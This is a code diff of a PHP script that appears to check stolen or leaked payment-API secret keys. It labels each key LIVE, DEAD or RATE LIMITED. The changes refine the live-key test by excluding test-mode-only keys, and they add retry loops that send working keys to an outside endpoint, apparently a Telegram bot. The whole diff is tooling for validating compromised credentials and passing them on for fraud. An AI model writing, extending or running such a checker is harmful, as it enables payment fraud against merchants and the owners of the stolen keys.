@@ -98,21 +98,26 @@ $sendinsufftotg = false;
 
 if(isset($res1['error'])){
 
-
     if ($res1['error']['type'] == 'invalid_request_error' && strpos($res1['error']['message'], 'rate limit exceeded') !== false) {
-        echo '<span class="badge badge-success" style="background-color:#440076;"><b>#RATE LIMITED</b></span> <font style="color:#fff700;"><b>'.$sk.'</b>';
+        echo '<span class="badge badge-success" style="background-color:#440076;"><b>#RATE LIMITED</b></span> <font style="color:#fff700;"><b>'.$sk.'</b><br>';
     }
     
     elseif ($res1['error']['type'] == 'invalid_request_error') {
-        echo '<span class="badge badge-danger"><b>#DEAD</b></span> <font style="color:#ff3e3e;"><b>'.$sk.'</b>';
+        echo '<span class="badge badge-danger"><b>#DEAD</b></span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
     }
 
     else{
-        while (!$sendchargedtotg && $num_retries < $max_retries) {
-            $sendchargedtotg = @file_get_contents($sendcharged);
-            $num_retries++;
+    
+        if (isset($res2['error']['code']) && $res2['error']['code'] === 'testmode_charges_only') {
+            echo '<span class="badge badge-danger"><b>#DEAD</b></span><span style="color: rgb(0 255 0);  font-weight: bold"> [testmode_charges_only]</span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
+        } else {
+            echo '<span class="badge badge-success"><b>#LIVE</b></span> <font style="color:#67ff00;"><b>'.$sk.'</b><br>';
+            while (!$sendchargedtotg && $num_retries < $max_retries) {
+                $sendchargedtotg = @file_get_contents($sendcharged);
+                $num_retries++;
+            }
+      
         }
-        echo '<span class="badge badge-success"><b>#LIVE</b></span> <font style="color:#67ff00;"><b>'.$sk.'</b>';
     }
     
 }else{
@@ -120,28 +125,38 @@ if(isset($res1['error'])){
     if(isset($res2['error'])){
         
         if ($res1['error']['type'] == 'invalid_request_error' && $res1['error']['code'] == 'rate_limit') {
-            echo '<span class="badge badge-success" style="background-color:#440076;"><b>#RATE LIMITED</b></span> <font style="color:#fff700;"><b>'.$sk.'</b>';
+            echo '<span class="badge badge-success" style="background-color:#440076;"><b>#RATE LIMITED</b></span> <font style="color:#fff700;"><b>'.$sk.'</b><br>';
     } 
     
     elseif ($res1['error']['type'] == 'invalid_request_error') {
-        echo '<span class="badge badge-danger"><b>#DEAD</b></span> <font style="color:#ff3e3e;"><b>'.$sk.'</b>';
+        echo '<span class="badge badge-danger"><b>#DEAD</b></span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
     }
 
     else{
-        while (!$sendchargedtotg && $num_retries < $max_retries) {
-            $sendchargedtotg = @file_get_contents($sendcharged);
-            $num_retries++;
+        if (isset($res2['error']['code']) && $res2['error']['code'] === 'testmode_charges_only') {
+            echo '<span class="badge badge-danger"><b>#DEAD</b></span><span style="color: rgb(0 255 0);  font-weight: bold"> [testmode_charges_only]</span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
+        } else {
+            echo '<span class="badge badge-success"><b>#LIVE</b></span> <font style="color:#67ff00;"><b>'.$sk.'</b><br>';
+            while (!$sendchargedtotg && $num_retries < $max_retries) {
+                $sendchargedtotg = @file_get_contents($sendcharged);
+                $num_retries++;
+            }
         }
-        echo '<span class="badge badge-success"><b>#LIVE</b></span> <font style="color:#67ff00;"><b>'.$sk.'</b>';
     }
-
+//'.$curl1.''.$curl2.'
     }
     else{
-        while (!$sendchargedtotg && $num_retries < $max_retries) {
-            $sendchargedtotg = @file_get_contents($sendcharged);
-            $num_retries++;
+       
+        
+        if (isset($res2['error']['code']) && $res2['error']['code'] === 'testmode_charges_only') {
+            echo '<span class="badge badge-danger"><b>#DEAD</b></span><span style="color: rgb(0 255 0);  font-weight: bold"> [testmode_charges_only]</span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
+        } else {
+            echo '<span class="badge badge-success"><b>#LIVE</b></span> <font style="color:#67ff00;"><b>'.$sk.'</b><br>';
+            while (!$sendchargedtotg && $num_retries < $max_retries) {
+                $sendchargedtotg = @file_get_contents($sendcharged);
+                $num_retries++;
+            }
         }
-        echo '<span class="badge badge-success"><b>#LIVE</b></span> <font style="color:#67ff00;"><b>'.$sk.'</b>';
     }
 }
 
